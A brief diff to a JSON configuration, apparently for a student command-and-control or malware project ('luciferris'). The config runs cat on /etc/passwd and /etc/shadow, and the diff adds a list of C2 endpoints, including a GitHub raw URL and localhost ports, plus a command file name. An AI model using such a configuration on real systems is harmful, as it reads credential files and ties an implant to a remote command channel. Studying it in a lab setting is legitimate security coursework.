@@ -2,5 +2,11 @@
   "id": 0,
   "mode": "borrow",
   "exepath": "/bin/cat",
-  "exeargs": ["/etc/passwd", "/etc/shadow"]
+  "exeargs": ["/etc/passwd", "/etc/shadow"],
+  "c2": [
+    "https://raw.githubusercontent.com/gahill18/enpm697_finalproject/main/luciferris/example_configs/",
+    "localhost:400",
+    "localhost:80"
+  ],
+  "c2docname": "get_command.json"
 }
